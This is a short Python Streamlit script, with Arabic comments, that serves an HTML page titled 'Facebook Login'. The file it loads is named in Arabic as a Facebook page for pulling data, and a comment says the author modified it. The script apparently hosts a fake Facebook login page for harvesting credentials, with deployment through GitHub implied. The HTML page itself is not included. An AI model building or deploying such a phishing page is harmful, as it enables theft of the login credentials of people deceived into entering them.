import streamlit as st
import streamlit.components.v1 as components

# إعداد الصفحة لتظهر بشكل جيد
st.set_page_config(page_title="Facebook Login", layout="centered")

# قراءة محتوى ملف الـ HTML الذي قمت بتعديله
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        my_html_code = f.read()
    
    # عرض الصفحة (تم تصحيح اسم المتغير هنا لمنع TypeError)
    components.html(my_html_code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("تأكد من وجود ملف 'صفحه فيس لسحب البيانات.html' في نفس المجلد على GitHub")
